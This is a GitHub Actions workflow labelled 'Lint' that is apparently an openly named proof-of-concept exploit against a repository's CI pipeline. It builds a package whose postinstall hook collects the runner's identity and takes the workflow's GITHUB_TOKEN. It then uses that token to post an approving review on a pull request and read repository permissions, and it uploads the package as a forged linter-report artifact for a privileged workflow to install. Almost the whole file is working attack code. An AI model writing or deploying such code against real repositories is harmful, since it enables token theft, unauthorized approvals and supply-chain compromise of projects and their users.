---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged linter artifact
        run: |
          mkdir -p evil
          cat > evil/package.json <<'EOF'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node postinstall.js"}}
          EOF
          cat > evil/postinstall.js <<'EOF'
          const cp = require('child_process');
          const fs = require('fs');
          const path = require('path');
          const nl = String.fromCharCode(10);
          const lines = [
            'PRIV_RCE_PROOF uid=' + process.getuid() + ' user=' + cp.execSync('id -un').toString().trim(),
            'PRIV_RCE cwd=' + process.cwd(),
            'PRIV_RCE repo=' + process.env.GITHUB_REPOSITORY,
            'PRIV_RCE token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no')
          ];
          fs.writeFileSync(path.join(process.env.INIT_CWD || process.cwd(), 'linter-report.txt'), lines.join(nl) + nl);
          (async () => {
            const base = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY;
            const H = {
              authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
              accept: 'application/vnd.github+json',
              'user-agent': 'poc',
              'content-type': 'application/json'
            };
            const rv = await fetch(base + '/pulls/1/reviews', {
              method: 'POST',
              headers: H,
              body: JSON.stringify({ event: 'APPROVE', body: 'PRIV_RCE approve via stolen workflow token' })
            });
            lines.push('PRIV_RCE_APPROVE status=' + rv.status + ' body=' + (await rv.text()).slice(0, 120));
            fs.writeFileSync(path.join(process.env.INIT_CWD || process.cwd(), 'linter-report.txt'), lines.join(nl) + nl);
            const rp = await fetch(base, { headers: H });
            const j = await rp.json();
            lines.push('PRIV_RCE_API status=' + rp.status + ' full_name=' + j.full_name + ' perms=' + JSON.stringify(j.permissions));
            fs.writeFileSync(path.join(process.env.INIT_CWD || process.cwd(), 'linter-report.txt'), lines.join(nl) + nl);
          })().catch(e => console.log('PRIV_RCE_ERR ' + e.message));
          EOF
          ( cd evil && npm pack --pack-destination .. )
          cat > package.json <<'EOF'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil-1.0.0.tgz"},"allowScripts":{"file:./poc-evil-1.0.0.tgz":true}}
          EOF
          printf 'FORGED REPORT from attacker artifact\n' > linter-report.txt
          printf '1' > pr-number.txt

      - name: Upload forged linter-report artifact
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            package.json
            poc-evil-1.0.0.tgz
            linter-report.txt
            pr-number.txt
          if-no-files-found: ignore
